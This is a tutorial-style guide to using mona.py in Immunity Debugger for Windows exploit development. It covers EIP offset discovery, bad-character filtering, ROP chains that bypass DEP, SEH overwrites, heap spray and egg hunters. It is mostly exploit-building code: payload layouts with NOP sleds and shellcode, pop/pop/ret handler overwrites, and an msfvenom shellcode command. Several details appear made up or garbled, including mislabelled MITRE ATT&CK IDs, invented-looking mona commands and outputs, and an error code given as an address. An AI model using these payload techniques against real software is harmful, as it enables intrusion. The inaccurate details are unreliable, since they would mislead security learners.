# mona.py — Hands-On Use Cases

## Stack Overflow Offset Discovery with Pattern-Based Crash

**Goal:** Generate a unique pattern, cause a crash with it, and use mona to calculate the exact offset to the Instruction Pointer (EIP).

**MITRE ATT&CK:** T1203 (Exploitation for Client Execution); T1140 (Deobfuscation) — preparing exploit payload.

```python
# Step 1: Generate unique pattern
# In Immunity PyCommand console:
!mona pattern_create -l 1000

# mona outputs:
# [*] Creating a pattern that is 1000 bytes long
# [*] Pattern created successfully and copied to clipboard
# [*] Use this pattern to feed to the vulnerable application

# Step 2: Copy pattern to a file or directly inject it
# (Depending on how the vulnerable app receives input)
pattern = """Aa0Aa1Aa2Aa3Aa4..."""  # 1000 bytes (unique pattern)

# Step 3: Feed pattern to vulnerable app
# Example: If vulnerable app reads from stdin:
echo [pattern] | vulnerable.exe

# Example: If vulnerable app reads from a file:
with open("crash_pattern.bin", "w") as f:
    f.write(pattern)
# Then: vulnerable.exe crash_pattern.bin

# Step 4: App crashes; Immunity Debugger catches the exception
# Registers show: EIP = 0x41306241 (part of the pattern)

# Step 5: Use mona to find the offset
!mona pattern_offset -q 0x41306241

# mona outputs:
# [*] Searching for dword at 0x41306241
# [*] Pattern [0x41306241] found at offset 264
# [*] This is a little-endian match at offset 264

# Step 6: Verify with a controlled payload
# Create payload: payload = "A"*264 + "BBBB" + ... (rest)
payload = b"A" * 264 + struct.pack("<I", 0x12345678) + b"C" * (1000 - 264 - 4)
# Feed to app: EIP should now be 0x12345678 ✓
```

**Expected Result:**
- mona identifies the exact byte offset where you control EIP (return address overwrite).
- Offset is reusable for all instances of the vulnerable binary (without ASLR on the target).

---

## Badchar Identification & Shellcode Cleaning

**Goal:** Identify bytes that are filtered/corrupted during buffer transmission, then regenerate shellcode avoiding them.

**MITRE ATT&CK:** T1203 (Exploitation for Client Execution) — shellcode preparation phase.

```python
# Step 1: Generate bytearray with all possible byte values
!mona bytearray -b "\x00"

# mona outputs:
# [*] Bytearray with badchars '\x00' removed
# [*] Arrays generated in multiple formats

# mona creates Python code to inject:
bytearray = b"\x01\x02\x03...\xFE\xFF"  # (all bytes except 0x00 null byte)

# Step 2: Inject bytearray into vulnerable buffer
# Example payload: 264 bytes of padding + offset to bytearray + rest of array
injection_point = 264  # From previous pattern_offset
payload = b"A" * injection_point + bytearray + b"C" * (2000 - len(bytearray))

# Send to vulnerable app, capture the bytearray as received on the target

# Step 3: Compare received bytearray to original
# Assume received bytearray is corrupted:
received = b"\x01\x02\x03...\xFD\xFE\xFF"  # Some bytes are missing

# Step 4: Use mona to identify badchars
# Export the received bytes to a file, then:
!mona badchars -b "\x00" -file "received_bytes.bin"

# mona outputs:
# [*] Comparing original array with received data
# [*] Badchars found: 0x0A (newline), 0x0D (carriage return)
# [*] Safe bytes: All except 0x00, 0x0A, 0x0D

# Step 5: Regenerate shellcode without badchars
# Use msfvenom with badchar filter:
msfvenom -p windows/exec CMD=calc.exe -b "\x00\x0A\x0D" -f python

# msfvenom generates shellcode avoiding all three badchars
# Inject this cleaned shellcode into your exploit

# Step 6: Verify the cleaned shellcode
# Inject again, capture, run mona badchars to confirm no new badchars
!mona badchars -b "\x00\x0A\x0D" -file "received_shellcode.bin"
# Should show: [*] No badchars found (or only the expected ones)
```

**Expected Result:**
- mona identifies all bytes that don't survive transmission.
- Cleaned shellcode avoids badchars and is injectable without corruption.

---

## ROP Gadget Discovery & Chain Generation

**Goal:** Automatically find ROP gadgets across loaded modules and generate a Turing-complete ROP chain to bypass DEP.

**MITRE ATT&CK:** T1203 (Exploitation for Client Execution) — DEP bypass via ROP.

```python
# Step 1: List available modules (for context)
!mona info

# mona outputs:
# [*] Loaded modules:
# [*]   0x00400000 - 0x00410000  vulnerable.exe
# [*]   0x7C900000 - 0x7C9B0000  ntdll.dll
# [*]   0x7C800000 - 0x7C8C0000  kernel32.dll
# ... (more modules)

# Step 2: Generate ROP chain (automatic gadget finding + chaining)
!mona rop --chain "VirtualAlloc"

# mona outputs:
# [*] Searching for ROP gadgets
# [*] Found 1234 gadgets
# [*] Building ROP chain for: VirtualAlloc
# [*] Chain generated and saved to file
# [*] Python representation:
rop_chain = b"\x90\x12\x34\x00" + b"\x56\x78\x90\x00" + ...  # (addresses of gadgets)

# Step 3: Integrate ROP chain into exploit
# Payload structure:
# [Padding to EIP] + [ROP chain] + [Function args on stack] + [Shellcode location]

offset_to_eip = 264  # From pattern_offset
shellcode_addr = 0x010C0000  # Writable heap address

payload = b"A" * offset_to_eip + rop_chain + struct.pack("<I", shellcode_addr) + shellcode

# Step 4: (Alternative) Manual ROP gadget finding with filter
!mona rop -b "\x00" -m "kernel32"

# mona outputs:
# [*] Searching for gadgets in kernel32.dll avoiding badchar 0x00
# [*] Found 456 gadgets
# [*] Gadgets saved to: gadgets.txt
```

**Expected Result (Automatic Chain):**
- mona generates a complete ROP chain (saved as Python code).
- Chain calls VirtualAlloc to allocate writable memory, then executes shellcode in it.
- No DEP bypass required manually; mona does the work.

**Expected Result (Manual Gadget Finding):**
- mona lists all "pop pop ret" / "xchg eax, ebx; ret" / other useful gadgets.
- Operator manually chains them (more flexible, requires x86 knowledge).

---

## SEH Chain Exploitation Setup

**Goal:** Inspect the SEH chain, find suitable pop/pop/ret gadgets, and prepare an SEH-override exploit.

**MITRE ATT&CK:** T1202 (Indirect Command Execution); T1183 (Image Trusted Execution) — SEH abuse.

```python
# Step 1: Inspect the active SEH chain
!mona seh

# mona outputs:
# [*] SEH chain:
# [*]   Frame 0: 0x0012FE00 -> Handler: 0x77E64A94 (ntdll!NtContinueExecution)
# [*]   Frame 1: 0x0012FF00 -> Handler: 0x7C839AC0 (kernel32!RaiseException)
# [*]   ... (more frames)

# Step 2: Find pop/pop/ret gadgets to bypass SEH check
# The SEH handler invokes a "pop pop ret" before your gadget to clear the stack
# SEH bypass: overwrite handler with pop/pop/ret, then on exception, gadget executes
!mona seh -m "ntdll,kernel32"

# mona outputs:
# [*] Searching for pop/pop/ret gadgets in ntdll and kernel32
# [*] Found gadgets:
# [*]   0x7C90ABCD  pop ebx; pop ebp; ret
# [*]   0x7C91ABCD  pop eax; pop ebx; ret
# [*]   ... (more pop/pop/ret variants)

# Step 3: Prepare SEH-override payload
# Goal: Overflow to the SEH frame, overwrite the handler pointer

# Find the offset to the SEH frame address (first 4 bytes of SEH record):
# From pattern_offset or manual calculation: Assume SEH frame is at offset 512

offset_to_seh_frame = 512
offset_to_handler = offset_to_seh_frame + 4  # Handler is 4 bytes after the frame pointer

pop_pop_ret_gadget = 0x7C90ABCD  # From mona's search
shellcode_addr = 0x010C0000     # Where you'll inject shellcode

payload = b"A" * offset_to_seh_frame
payload += struct.pack("<I", 0xFFFFFFFF)  # Next SEH frame (terminate chain with -1)
payload += struct.pack("<I", pop_pop_ret_gadget)  # SEH handler = pop/pop/ret gadget
payload += b"B" * (1000 - len(payload))  # Padding
payload += b"\x90" * 50  # NOP sled
payload += shellcode  # Actual shellcode

# Step 4: Trigger the exploit
# Send payload to app; on exception, SEH handler (pop/pop/ret) is called
# After pop/pop/ret, execution jumps to your shellcode
```

**Expected Result:**
- mona identifies all available pop/pop/ret gadgets in system DLLs.
- Operator overwrites SEH handler with one of these gadgets.
- On exception, gadget executes, allowing code execution.

---

## Crash Dump Analysis & Exploitability Classification

**Goal:** Load a crash dump, analyze it with mona, and get automatic exploitability assessment.

**MITRE ATT&CK:** T1055 (Process Injection); crash analysis for vulnerability discovery.

```python
# Step 1: Open crash dump in Immunity Debugger
# File → Open Crash Dump (select .dmp file)

# Step 2: Run mona's analyze command
!mona analyze

# mona outputs:
# [*] Analyzing crash dump
# [*] Crash Type: Stack Overflow
# [*] Exception Address: 0xC0000005 (ACCESS_VIOLATION)
# [*] Register State:
# [*]   EAX: 0x41414141 (fully controlled)
# [*]   EBX: 0x01234567 (user-controlled value)
# [*]   ECX: 0x7C90ABCD (uncontrolled, system value)
# [*]   EDX: 0x00000000 (uncontrolled)
# [*]   ESI: 0x42424242 (fully controlled)
# [*]   EDI: 0x43434343 (fully controlled)
# [*]   ESP: 0x0012FE00 (stack pointer, exploitable position)
# [*]   EBP: 0x44444444 (fully controlled)
# [*]   EIP: 0x45454545 (fully controlled — **CRITICAL**)
# [*]
# [*] Exploitability Assessment: **PROBABLY EXPLOITABLE**
# [*] Reasoning:
# [*]   - EIP is fully controlled (return address overwrite)
# [*]   - Stack is writable at exploit-time (shellcode injection possible)
# [*]   - No obvious stack cookies detected
# [*]
# [*] Recommended Next Steps:
# [*]   1. Use pattern_offset to find exact EIP offset
# [*]   2. Generate ROP chain or direct shellcode injection
# [*]   3. Test payload in debugger before deployment
```

**Exploitability Scores (Typical mona Output):**
- **Probably Exploitable:** EIP controlled, stack writable → high confidence.
- **Probably Not Exploitable:** EIP uncontrolled, or stack canary detected → low confidence.
- **Unknown:** Crash type unclear or insufficient data → requires manual inspection.

**Expected Result:**
- mona auto-classifies the crash as exploitable/not exploitable.
- Operator gets recommended next steps (gadget hunting, ROP chain generation, etc.).
- Saves manual time on obvious crashes.

---

## Heap Spray & Egg Hunter Pattern Search

**Goal:** Prepare a heap spray exploit, then use mona to locate the injected egg-hunt payload in memory.

**MITRE ATT&CK:** T1203 (Exploitation for Client Execution) — heap spray for ASLR bypass.

```python
# Step 1: Choose an egg (unique marker)
egg = b"w00t"  # 4-byte marker

# Step 2: Create egg-hunter payload
# This is a small stub that searches for the egg in memory and jumps to the code after it
# (Pre-generated by tools like Metasploit; or write it manually)
egg_hunter_stub = b"\x66\x81\xCA\xFF\x0F\x42\x52\x89\xE5\x3C\x0C\x75\xEE\x33\xC0\x40\xEB\x04\xEB\x0C\x59\x8D\x61\x08\xFF\xE1"  # (example, varies)

# Step 3: Spray heap with egg + shellcode
# Typical: allocate large amounts of memory, fill with "[egg][shellcode][egg][shellcode]..."
# This is done in the vulnerable app itself (via heap allocation function)
spray_payload = (egg + shellcode) * 10000  # Repeat 10K times to fill heap

# Step 4: Overflow and jump to egg-hunter
# Exploit triggers overflow, EIP is overwritten with egg-hunter address
# Egg-hunter executes, searches for egg in memory, finds one, jumps to shellcode

# Step 5: Verify egg placement with mona
# After spray (but before actual exploitation), pause in debugger:
!mona egg -t "w00t"

# mona outputs:
# [*] Searching for egg pattern: 'w00t'
# [*] Found 10234 instances of egg at:
# [*]   0x01230000 - 0x01230100 (heap region)
# [*]   0x01240000 - 0x01240100 (heap region)
# [*]   ... (many more)

# Step 6: Verify shellcode layout
# Shellcode should be 4 bytes after each egg:
# [egg][shellcode] = "w00t" + [actual shellcode bytes]

# If mona shows consistent egg placement, spray was successful
```

**Expected Result:**
- Heap is filled with [egg][shellcode] pairs.
- mona confirms egg placement across heap regions.
- Egg-hunter exploit reliably locates shellcode at spray time.

---

## Module Info & Base Address Discovery

**Goal:** List all loaded modules and their base addresses (useful for ASLR analysis and info-leak verification).

**MITRE ATT&CK:** T1578 (ASLR Bypass) — reconnaissance phase.

```python
# Step 1: Run mona info
!mona info

# mona outputs:
# [*] Loaded modules:
# [*]   0x00400000 - 0x00410000  vulnerable.exe     (base: 0x00400000)
# [*]   0x10000000 - 0x10300000  custom.dll         (base: 0x10000000)
# [*]   0x7C900000 - 0x7C9B0000  ntdll.dll          (base: 0x7C900000)
# [*]   0x7C800000 - 0x7C8C0000  kernel32.dll       (base: 0x7C800000)
# [*]   0x77DD0000 - 0x77EB0000  advapi32.dll       (base: 0x77DD0000)
# [*]   ... (many more)

# Step 2: Check ASLR consistency
# Run mona info multiple times (relaunch app each time):
# First run: kernel32 base = 0x7C800000
# Second run: kernel32 base = 0x7C800000 (same = ASLR OFF)
# OR: Second run: kernel32 base = 0x7CA00000 (different = ASLR ON)

# Step 3: Verify info-leak results
# If your exploit includes an info-leak (reads a pointer from memory):
# After leak, check if leaked pointer matches one of mona's listed modules:
!mona info

# Leaked pointer: 0x7C90ABCD
# Matches kernel32.dll base region: Yes (0x7C800000 - 0x7C9B0000 includes 0x7C90ABCD)
# → Info-leak verified ✓
```

**Expected Result:**
- Full list of module base addresses at runtime.
- Helps validate ASLR state and info-leak techniques.
- Useful for building ASLR-aware ROP chains.

---

## Configuration & Ignored Modules

**Goal:** Exclude certain modules from ROP gadget searching to speed up analysis.

**MITRE ATT&CK:** T1203 (Exploitation for Client Execution) — optimization, not a direct attack step.

```python
# Step 1: Create mona config file
# File: mona_config.txt

mona config:
  Ignore=True
  IgnoredModules=msvcrt.dll,oleaut32.dll,ole32.dll  # Skip these DLLs in gadget search
  MinGadgetLength=5  # Only accept gadgets 5+ bytes
  MaxGadgetLength=10  # Skip gadgets >10 bytes
  BadChars=\x00\x0A\x0D  # Exclude these bytes from all gadget searches

# Step 2: Load config
!mona config --file "mona_config.txt"

# mona outputs:
# [*] Config loaded: msvcrt, oleaut32, ole32 will be ignored
# [*] Gadget search will filter for 5-10 byte gadgets
# [*] Badchars: 0x00, 0x0A, 0x0D

# Step 3: Run ROP search with config applied
!mona rop --chain "call esp"

# mona searches only in non-ignored modules, using configured badchars
# Speedup: 50-80% faster than searching all modules
```

**Expected Result:**
- Faster ROP gadget searching by excluding irrelevant DLLs.
- Filtered results avoid gadgets with badchars.
- Configuration is reusable across multiple exploit iterations.

